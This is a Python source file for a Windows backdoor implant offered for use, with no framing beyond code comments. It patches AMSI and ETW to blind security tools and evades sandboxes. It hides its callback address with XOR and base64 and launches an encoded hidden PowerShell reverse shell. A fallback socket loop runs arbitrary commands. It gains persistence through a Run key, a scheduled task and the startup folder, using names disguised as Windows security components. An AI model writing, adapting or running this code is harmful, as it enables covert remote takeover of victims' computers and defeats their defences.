import os
import sys
import time
import random
import string
import base64
import ctypes
from ctypes import wintypes
import subprocess
import socket
import threading
import tempfile
import shutil

# === ANTI-ANALYSIS TECHNIQUES ===
def anti_sandbox_checks():
    """Basic sandbox detection and evasion"""
    try:
        # Check for common sandbox indicators
        sandbox_processes = ['vboxservice.exe', 'vmtoolsd.exe', 'sandboxiedcomlaunch.exe']
        for proc in sandbox_processes:
            if proc.lower() in [p.lower() for p in os.listdir('C:\\Windows\\System32\\')]:
                time.sleep(random.randint(60, 300))  # Delay execution
        
        # Mouse movement check (sandboxes often have no mouse activity)
        user32 = ctypes.windll.user32
        pos1 = wintypes.POINT()
        user32.GetCursorPos(ctypes.byref(pos1))
        time.sleep(2)
        pos2 = wintypes.POINT()
        user32.GetCursorPos(ctypes.byref(pos2))
        
        if pos1.x == pos2.x and pos1.y == pos2.y:
            time.sleep(random.randint(30, 120))
        
        return True
    except:
        return True

def unhook_amsi():
    """Advanced AMSI bypass using multiple techniques"""
    try:
        # Method 1: Memory patching
        kernel32 = ctypes.windll.kernel32
        amsi = kernel32.GetModuleHandleW("amsi.dll")
        
        if amsi:
            AmsiScanBuffer = kernel32.GetProcAddress(amsi, b"AmsiScanBuffer")
            if AmsiScanBuffer:
                # Patch with simple return
                patch = b"\x31\xC0\x05\x57\x00\x07\x80\xC3"  # xor eax,eax; add eax,0x80070057; ret
                old_protect = wintypes.DWORD()
                
                if kernel32.VirtualProtect(AmsiScanBuffer, len(patch), 0x40, ctypes.byref(old_protect)):
                    ctypes.memmove(AmsiScanBuffer, patch, len(patch))
                    kernel32.VirtualProtect(AmsiScanBuffer, len(patch), old_protect, ctypes.byref(old_protect))
        
        # Method 2: AmsiInitialize bypass
        AmsiInitialize = kernel32.GetProcAddress(amsi, b"AmsiInitialize")
        if AmsiInitialize:
            patch2 = b"\x31\xC0\xC3"  # xor eax,eax; ret
            old_protect2 = wintypes.DWORD()
            if kernel32.VirtualProtect(AmsiInitialize, len(patch2), 0x40, ctypes.byref(old_protect2)):
                ctypes.memmove(AmsiInitialize, patch2, len(patch2))
                kernel32.VirtualProtect(AmsiInitialize, len(patch2), old_protect2, ctypes.byref(old_protect2))
        
        return True
    except:
        return False

def disable_etw():
    """Disable ETW (Event Tracing for Windows)"""
    try:
        kernel32 = ctypes.windll.kernel32
        ntdll = kernel32.GetModuleHandleW("ntdll.dll")
        
        if ntdll:
            EtwEventWrite = kernel32.GetProcAddress(ntdll, b"EtwEventWrite")
            if EtwEventWrite:
                patch = b"\x31\xC0\xC3"  # xor eax,eax; ret
                old_protect = wintypes.DWORD()
                if kernel32.VirtualProtect(EtwEventWrite, len(patch), 0x40, ctypes.byref(old_protect)):
                    ctypes.memmove(EtwEventWrite, patch, len(patch))
                    kernel32.VirtualProtect(EtwEventWrite, len(patch), old_protect, ctypes.byref(old_protect))
        return True
    except:
        return False

# === OBFUSCATION FUNCTIONS ===
def xor_encrypt(data, key=0x42):
    """Simple XOR encryption for strings"""
    if isinstance(data, str):
        data = data.encode()
    return bytes([b ^ key for b in data])

def decode_string(encoded_data, key=0x42):
    """Decode XOR encrypted strings at runtime"""
    return xor_encrypt(base64.b64decode(encoded_data), key).decode()

# Obfuscated configuration (decode at runtime)
ENCODED_HOST = base64.b64encode(xor_encrypt("10.0.2.15")).decode()  # Replace with your IP
ENCODED_PORT = base64.b64encode(xor_encrypt("4433")).decode()

def get_config():
    """Decode configuration at runtime"""
    host = decode_string(ENCODED_HOST)
    port = int(decode_string(ENCODED_PORT))
    return host, port

# === PROCESS HOLLOWING ===
def create_hollow_process():
    """Create a legitimate process and hollow it out"""
    try:
        # Use a legitimate Windows process
        target_process = "C:\\Windows\\System32\\notepad.exe"
        
        startup_info = subprocess.STARTUPINFO()
        startup_info.dwFlags = subprocess.STARTF_USESHOWWINDOW
        startup_info.wShowWindow = subprocess.SW_HIDE
        
        # Create suspended process
        process = subprocess.Popen(
            target_process,
            startupinfo=startup_info,
            creationflags=0x00000004  # CREATE_SUSPENDED
        )
        
        return process.pid
    except:
        return None

# === FILELESS PAYLOAD EXECUTION ===
def execute_in_memory():
    """Execute payload directly in memory without writing to disk"""
    
    # Base64 encoded PowerShell reverse shell payload
    ps_payload = """
    $client = New-Object System.Net.Sockets.TCPClient('{HOST}',{PORT});
    $stream = $client.GetStream();
    [byte[]]$bytes = 0..65535|%{{0}};
    while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
        $sendback = (iex $data 2>&1 | Out-String );
        $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
        $stream.Write($sendbyte,0,$sendbyte.Length);
        $stream.Flush()
    }};
    $client.Close()
    """
    
    host, port = get_config()
    ps_payload = ps_payload.replace('{HOST}', host).replace('{PORT}', str(port))
    
    # Encode payload to avoid string detection
    encoded_payload = base64.b64encode(ps_payload.encode('utf-16le')).decode()
    
    try:
        # Execute via PowerShell with various bypasses
        cmd = [
            'powershell.exe',
            '-WindowStyle', 'Hidden',
            '-ExecutionPolicy', 'Bypass',
            '-NonInteractive',
            '-NoProfile',
            '-Command',
            f'[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("{encoded_payload}"))|iex'
        ]
        
        subprocess.Popen(cmd, startupinfo=subprocess.STARTUPINFO(), 
                        creationflags=subprocess.CREATE_NO_WINDOW)
        return True
    except:
        return False

# === PERSISTENCE MECHANISMS ===
def add_multiple_persistence():
    """Add persistence using multiple methods"""
    try:
        current_file = os.path.abspath(sys.argv[0])
        
        # Method 1: Registry Run key
        try:
            import winreg
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, "SecurityHealthSystray", 0, winreg.REG_SZ, current_file)
        except:
            pass
        
        # Method 2: Scheduled Task
        try:
            task_cmd = f'schtasks /create /tn "WindowsUpdateCheck" /tr "{current_file}" /sc onlogon /ru "%username%" /f'
            subprocess.run(task_cmd, shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass
        
        # Method 3: Startup folder
        try:
            startup_folder = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
            startup_file = os.path.join(startup_folder, "WindowsSecurity.exe")
            shutil.copy2(current_file, startup_file)
        except:
            pass
        
        return True
    except:
        return False

# === MAIN PAYLOAD ===
def main_payload():
    """Main reverse shell payload with multiple connection methods"""
    host, port = get_config()
    
    # Method 1: Try fileless PowerShell execution
    if execute_in_memory():
        return
    
    # Method 2: Direct socket connection with obfuscation
    max_attempts = 10
    for attempt in range(max_attempts):
        try:
            # Random delay to avoid pattern detection
            time.sleep(random.uniform(5, 15))
            
            # Create socket connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            sock.connect((host, port))
            
            # Send initial beacon
            hostname = os.environ.get('COMPUTERNAME', 'Unknown')
            username = os.environ.get('USERNAME', 'Unknown')
            initial = f"[{hostname}\\{username}] Connection established via Method 2\n"
            sock.send(initial.encode())
            
            # Command loop
            while True:
                try:
                    command = sock.recv(4096).decode().strip()
                    if not command or command.lower() == 'exit':
                        break
                    
                    if command.lower() == 'persist':
                        result = add_multiple_persistence()
                        sock.send(f"Persistence: {'Success' if result else 'Failed'}\n".encode())
                        continue
                    
                    # Execute command
                    try:
                        output = subprocess.check_output(
                            command, 
                            shell=True, 
                            stderr=subprocess.STDOUT,
                            creationflags=subprocess.CREATE_NO_WINDOW
                        ).decode('utf-8', errors='replace')
                    except subprocess.CalledProcessError as e:
                        output = e.output.decode('utf-8', errors='replace')
                    
                    if not output:
                        output = "Command executed successfully\n"
                    
                    sock.send(output.encode())
                    
                except socket.error:
                    break
                except Exception as e:
                    sock.send(f"Error: {str(e)}\n".encode())
            
            sock.close()
            break
            
        except Exception:
            if attempt < max_attempts - 1:
                time.sleep(random.uniform(30, 60))
            continue

# === STEALTH DEPLOYMENT ===
def deploy_stealth():
    """Deploy with stealth techniques"""
    try:
        # Get current executable path
        current_exe = sys.argv[0]
        
        # Create hidden copy in system-like location
        system_paths = [
            os.path.expanduser("~\\AppData\\Local\\Microsoft\\Windows"),
            os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows"),
            tempfile.gettempdir()
        ]
        
        for path in system_paths:
            try:
                if not os.path.exists(path):
                    os.makedirs(path, exist_ok=True)
                
                # Use legitimate-sounding filename
                filenames = ['SecurityHealth.exe', 'WindowsUpdate.exe', 'SystemCheck.exe']
                hidden_path = os.path.join(path, random.choice(filenames))
                
                # Copy if not already in hidden location
                if os.path.normcase(current_exe) != os.path.normcase(hidden_path):
                    shutil.copy2(current_exe, hidden_path)
                    
                    # Set hidden attributes
                    try:
                        FILE_ATTRIBUTE_HIDDEN = 0x02
                        FILE_ATTRIBUTE_SYSTEM = 0x04
                        ctypes.windll.kernel32.SetFileAttributesW(
                            hidden_path, 
                            FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM
                        )
                    except:
                        pass
                    
                    # Execute hidden copy and exit
                    subprocess.Popen([hidden_path], creationflags=subprocess.CREATE_NO_WINDOW)
                    sys.exit(0)
                break
            except:
                continue
    except:
        pass

# === MAIN EXECUTION ===
def main():
    """Main function with all evasion techniques"""
    try:
        # Anti-analysis checks
        anti_sandbox_checks()
        
        # Disable security features
        unhook_amsi()
        disable_etw()
        
        # Deploy with stealth
        deploy_stealth()
        
        # Add persistence
        add_multiple_persistence()
        
        # Small random delay
        time.sleep(random.uniform(3, 10))
        
        # Execute main payload
        main_payload()
        
    except Exception:
        # Fail silently
        pass

if __name__ == "__main__":
    main()
